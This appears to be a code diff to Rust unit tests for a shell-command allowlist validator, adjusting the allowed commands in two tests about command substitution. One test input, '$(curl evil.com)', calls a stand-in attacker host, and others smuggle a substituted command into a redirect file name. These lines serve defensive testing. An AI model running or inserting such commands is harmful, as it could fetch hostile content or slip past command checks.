@@ -256,7 +256,7 @@ fn blocks_eval() {
 }
 #[test]
 fn blocks_command_substitution_at_command_pos() {
-    let list = allow(&["echo", "cat"]);
+    let list = allow(&["echo"]);
     assert!(check_all_segments("$(curl evil.com)", &list).is_err());
 }
 #[test]
@@ -1568,7 +1568,7 @@ fn extract_bash_interpreters_from_json() {
 /// shell word, while the subshell body is still checked as a command.
 #[test]
 fn subshell_redirect_targets_with_command_substitution_are_parsed() {
-    let list = allow(&["echo"]);
+    let list = allow(&["echo", "cat"]);
     let unquoted = concat!("(echo ok) > /tmp/lc_$", "(echo a).txt");
     let quoted = concat!(r#"(echo ok) > "/tmp/lc_$"#, "(echo c).txt\"");
     let control_substitution = concat!("echo ok > /tmp/lc_$", "(echo b).txt");
